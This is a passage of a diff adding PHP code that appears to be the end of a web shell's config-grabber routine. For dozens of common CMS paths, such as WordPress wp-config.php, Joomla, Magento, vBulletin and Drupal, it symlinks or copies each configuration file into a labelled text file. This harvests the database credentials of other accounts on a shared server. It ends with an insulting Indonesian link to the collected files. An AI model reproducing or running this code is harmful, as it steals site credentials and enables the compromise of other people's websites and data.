+symlink('/'.$home.'/'.$user.'/public_html/v2/configuration.php',$user.'JOOMLA.txt');
+symlink('/'.$home.'/'.$user.'/public_html/joomla/configuration.php',$user.'JOOMLA.txt');
+symlink('/'.$home.'/'.$user.'/public_html/new/configuration.php',$user.'JOOMLA.txt');
+symlink('/'.$home.'/'.$user.'/public_html/app/etc/local.xml',$user.'  MAGENTO.txt');
+symlink('/'.$home.'/'.$user.'/public_html/config/settings.inc.php',$user.'  PRESTASHOP.txt');
+copy('/'.$home.'/'.$user.'/public_html/application/config/database.php',$user.'  ELLISLAB.txt');
+copy('/'.$home.'/'.$user.'/public_html/admin/config.php',$user.'  OPENCART.txt');
+copy('/'.$home.'/'.$user.'/public_html/default/settings.php',$user.'  DRUPAL.txt');
+copy('/'.$home.'/'.$user.'/public_html/forum/config.php',$user.'  PHPBB.txt');
+symlink('/'.$home.'/'.$user.'/public_html/application/config/database.php',$user.'  ELLISLAB.txt');
+symlink('/'.$home.'/'.$user.'/public_html/admin/config.php',$user.'  OPENCART.txt');
+symlink('/'.$home.'/'.$user.'/public_html/default/settings.php',$user.'  DRUPAL.txt');
+symlink('/'.$home.'/'.$user.'/public_html/forum/config.php',$user.'  PHPBB.txt');
+copy('/'.$home.'/'.$user.'/public_html/vb/includes/config.php',$user.'  VBULLETIN.txt');
+copy('/'.$home.'/'.$user.'/public_html/includes/config.php',$user.'  VBULLETIN.txt');
+copy('/'.$home.'/'.$user.'/public_html/forum/includes/config.php',$user.'  VBULLETIN.txt');
+copy('/'.$home.'/'.$user.'/public_htm/config.php',$user.'  OTHER.txt');
+copy('/'.$home.'/'.$user.'/public_htm/html/config.php',$user.'  PHPNUKE.txt');
+symlink('/'.$home.'/'.$user.'/public_html/vb/includes/config.php',$user.'  VBULLETIN.txt');
+symlink('/'.$home.'/'.$user.'/public_html/includes/config.php',$user.'  VBULLETIN.txt');
+symlink('/'.$home.'/'.$user.'/public_html/forum/includes/config.php',$user.'  VBULLETIN.txt');
+symlink('/'.$home.'/'.$user.'/public_htm/config.php',$user.'  OTHER.txt');
+symlink('/'.$home.'/'.$user.'/public_htm/html/config.php',$user.'  PHPNUKE.txt');
+copy('/'.$home.'/'.$user.'/public_htm/conn.php',$user.'  OTHER.txt');
+symlink('/'.$home.'/'.$user.'/public_html/conn.php',$user.'  OTHER.txt');
+symlink('/'.$home.'/'.$user.'/public_html/inc/config.inc.php',$user.'  OTHER.txt');
+copy('/'.$home.'/'.$user.'/public_html/application/config/database.php',$user.'  OTHER.txt');
+symlink('/'.$home.'/'.$user.'/public_html/application/config/database.php',$user.'  OTHER.txt');
+copy('/'.$home.'/'.$user.'/public_html/inc/config.inc.php',$user.'  OTHER.txt');
+copy('/var/www/wp-config.php','WORDPRESS.txt');
+copy('/var/www/configuration.php','JOOMLA.txt');
+copy('/var/www/config.inc.php','OPENJOURNAL.txt');
+copy('/var/www/config.php','OTHER.txt');
+copy('/var/www/config/koneksi.php','OTHER.txt');
+copy('/var/www/include/config.php','OTHER.txt');
+copy('/var/www/connect.php','OTHER.txt');
+copy('/var/www/config/connect.php','OTHER.txt');
+copy('/var/www/include/connect.php','OTHER.txt');
+copy('/var/www/html/wp-config.php','WORDPRESS.txt');
+copy('/var/www/html/configuration.php','JOOMLA.txt');
+copy('/var/www/html/config.inc.php','OPENJOURNAL.txt');
+copy('/var/www/html/config.php','OTHER.txt');
+copy('/var/www/html/config/koneksi.php','OTHER.txt');
+copy('/var/www/html/include/config.php','OTHER.txt');
+copy('/var/www/html/connect.php','OTHER.txt');
+copy('/var/www/html/config/connect.php','OTHER.txt');
+copy('/var/www/html/include/connect.php','OTHER.txt');
+symlink('/var/www/wp-config.php','WORDPRESS.txt');
+symlink('/var/www/configuration.php','JOOMLA.txt');
+symlink('/var/www/config.inc.php','OPENJOURNAL.txt');
+symlink('/var/www/config.php','OTHER.txt');
+symlink('/var/www/config/koneksi.php','OTHER.txt');
+symlink('/var/www/include/config.php','OTHER.txt');
+symlink('/var/www/connect.php','OTHER.txt');
+symlink('/var/www/config/connect.php','OTHER.txt');
+symlink('/var/www/include/connect.php','OTHER.txt');
+symlink('/var/www/html/wp-config.php','WORDPRESS.txt');
+symlink('/var/www/html/configuration.php','JOOMLA.txt');
+symlink('/var/www/html/config.inc.php','OPENJOURNAL.txt');
+symlink('/var/www/html/config.php','OTHER.txt');
+symlink('/var/www/html/config/koneksi.php','OTHER.txt');
+symlink('/var/www/html/include/config.php','OTHER.txt');
+symlink('/var/www/html/connect.php','OTHER.txt');
+symlink('/var/www/html/config/connect.php','OTHER.txt');
+symlink('/var/www/html/include/connect.php','OTHER.txt');
+}
+echo '<i><b><a href='.$folfig.'>cek Disini goblok!!!</a></b></i></center>';
+?>
+</td></table></body></html>
